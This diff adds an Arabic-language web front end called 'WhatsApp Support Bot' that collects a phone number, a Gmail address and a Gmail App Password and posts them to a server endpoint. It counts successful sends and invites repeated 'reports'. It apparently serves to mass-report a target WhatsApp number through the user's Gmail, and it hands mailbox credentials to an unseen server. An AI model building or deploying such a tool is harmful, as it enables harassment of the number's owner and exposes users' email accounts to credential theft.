@@ -1,1 +1,425 @@
-
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>WhatsApp Support Bot</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            direction: rtl;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            direction: ltr;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            display: none;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes fadeOut {
+            from { opacity: 1; transform: translateY(0); }
+            to { opacity: 0; transform: translateY(-10px); }
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+        
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+            display: block;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            color: white;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            background: rgba(255,255,255,0.2);
+            color: white;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+        
+        .note {
+            background: rgba(255,255,255,0.9);
+            padding: 12px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+        
+        .counter {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: 500;
+            color: white;
+            background: rgba(255,255,255,0.2);
+            padding: 8px;
+            border-radius: 20px;
+            display: inline-block;
+            width: auto;
+        }
+        
+        .counter-container {
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .clear-btn {
+            background: rgba(255,255,255,0.2);
+            color: white;
+            border: 1px solid rgba(255,255,255,0.3);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+            width: auto;
+            display: inline-block;
+        }
+        
+        .clear-btn:hover {
+            background: rgba(255,255,255,0.3);
+            transform: translateY(-1px);
+        }
+        
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📱 دعم واتساب</h1>
+            <p>أرسل مشكلتك إلى دعم واتساب</p>
+            <span class="badge">Mini App</span>
+        </div>
+        
+        <div class="card">
+            <div class="form-group">
+                <label>📞 رقم الهاتف (بدون +)</label>
+                <input type="tel" id="phoneNumber" placeholder="مثال: 966512345678" dir="ltr" autocomplete="off">
+            </div>
+            
+            <div class="form-group">
+                <label>📧 البريد الإلكتروني (Gmail)</label>
+                <input type="email" id="email" placeholder="example@gmail.com" dir="ltr">
+            </div>
+            
+            <div class="form-group">
+                <label>🔑 كلمة مرور التطبيق (App Password)</label>
+                <input type="password" id="password" placeholder="أدخل كلمة مرور التطبيق" dir="ltr">
+            </div>
+            
+            <button id="sendBtn" onclick="sendReport()">📤 إرسال البلاغ</button>
+        </div>
+        
+        <div id="status" class="status"></div>
+        
+        <div class="counter-container">
+            <div class="counter" id="counter">📊 لم يتم إرسال أي بلاغ بعد</div>
+            <button class="clear-btn" id="clearBtn" style="display: none;" onclick="resetCounter()">🔄 إعادة ضبط العداد</button>
+        </div>
+        
+        <div class="note">
+            💡 ملاحظة: استخدم كلمة مرور التطبيق وليس كلمة المرور العادية<br>
+            🔑 لإنشاء كلمة مرور تطبيق: https://myaccount.google.com/apppasswords<br>
+            📨 يمكنك إرسال عدة بلاغات متتالية
+        </div>
+    </div>
+    
+    <script>
+        let sendCount = 0;
+        let isSending = false;
+        
+        // تحميل العداد من localStorage
+        const savedCount = localStorage.getItem('sendCount');
+        if (savedCount) {
+            sendCount = parseInt(savedCount);
+            updateCounter();
+        }
+        
+        const phoneInput = document.getElementById('phoneNumber');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const sendBtn = document.getElementById('sendBtn');
+        const clearBtn = document.getElementById('clearBtn');
+        
+        // تحديث العداد
+        function updateCounter() {
+            const counterDiv = document.getElementById('counter');
+            if (sendCount === 0) {
+                counterDiv.innerHTML = '📊 لم يتم إرسال أي بلاغ بعد';
+                clearBtn.style.display = 'none';
+            } else {
+                counterDiv.innerHTML = `✅ تم إرسال ${sendCount} بلاغ${sendCount > 1 ? 'ات' : ''} بنجاح`;
+                clearBtn.style.display = 'inline-block';
+            }
+            localStorage.setItem('sendCount', sendCount);
+        }
+        
+        // إعادة ضبط العداد
+        window.resetCounter = function() {
+            sendCount = 0;
+            updateCounter();
+            showStatus('🔄 تم إعادة ضبط العداد', 'info');
+        };
+        
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+            statusDiv.style.display = 'block';
+            
+            // إخفاء الرسالة بعد 5 ثواني
+            setTimeout(() => {
+                if (statusDiv.style.display === 'block') {
+                    statusDiv.style.animation = 'fadeOut 0.3s';
+                    setTimeout(() => {
+                        statusDiv.style.display = 'none';
+                        statusDiv.style.animation = '';
+                    }, 300);
+                }
+            }, 5000);
+        }
+        
+        async function sendReport() {
+            if (isSending) return;
+            
+            const phoneNumber = phoneInput.value.trim();
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            // التحقق من المدخلات
+            if (!phoneNumber) {
+                showStatus('الرجاء إدخال رقم الهاتف', 'error');
+                phoneInput.focus();
+                return;
+            }
+            
+            if (!email) {
+                showStatus('الرجاء إدخال البريد الإلكتروني', 'error');
+                emailInput.focus();
+                return;
+            }
+            
+            if (!password) {
+                showStatus('الرجاء إدخال كلمة مرور التطبيق', 'error');
+                passwordInput.focus();
+                return;
+            }
+            
+            // التحقق من صيغة البريد
+            if (!email.match(/^[a-zA-Z0-9._%+-]+@gmail\.com$/)) {
+                showStatus('الرجاء إدخال بريد Gmail صحيح', 'error');
+                emailInput.focus();
+                return;
+            }
+            
+            // التحقق من صيغة الرقم
+            if (!phoneNumber.match(/^\d{8,15}$/)) {
+                showStatus('الرقم يجب أن يحتوي على 8-15 رقم فقط', 'error');
+                phoneInput.focus();
+                return;
+            }
+            
+            isSending = true;
+            sendBtn.disabled = true;
+            sendBtn.textContent = '📤 جاري الإرسال...';
+            
+            showStatus('🔄 جاري إرسال البلاغ...', 'info');
+            
+            try {
+                // إرسال البيانات إلى الخادم
+                const response = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        phone: phoneNumber,
+                        email: email,
+                        password: password
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    sendCount++;
+                    updateCounter();
+                    
+                    // مسح الحقول
+                    phoneInput.value = '';
+                    emailInput.value = '';
+                    passwordInput.value = '';
+                    
+                    showStatus(`✅ ${result.message}`, 'success');
+                    
+                    // التركيز على حقل رقم الهاتف
+                    setTimeout(() => phoneInput.focus(), 100);
+                } else {
+                    showStatus(`❌ ${result.message}`, 'error');
+                }
+                
+            } catch (error) {
+                console.error('Error:', error);
+                showStatus('❌ حدث خطأ في الاتصال بالخادم', 'error');
+            } finally {
+                isSending = false;
+                sendBtn.disabled = false;
+                sendBtn.textContent = '📤 إرسال البلاغ';
+            }
+        }
+        
+        // دعم إرسال بالضغط على Enter
+        phoneInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendReport();
+        });
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendReport();
+        });
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendReport();
+        });
+        
+        // حفظ آخر بريد في localStorage
+        const savedEmail = localStorage.getItem('lastEmail');
+        if (savedEmail) emailInput.value = savedEmail;
+        
+        emailInput.addEventListener('change', function() {
+            if (this.value.match(/^[a-zA-Z0-9._%+-]+@gmail\.com$/)) {
+                localStorage.setItem('lastEmail', this.value);
+            }
+        });
+        
+        console.log('Mini App ready');
+    </script>
+</body>
+</html>
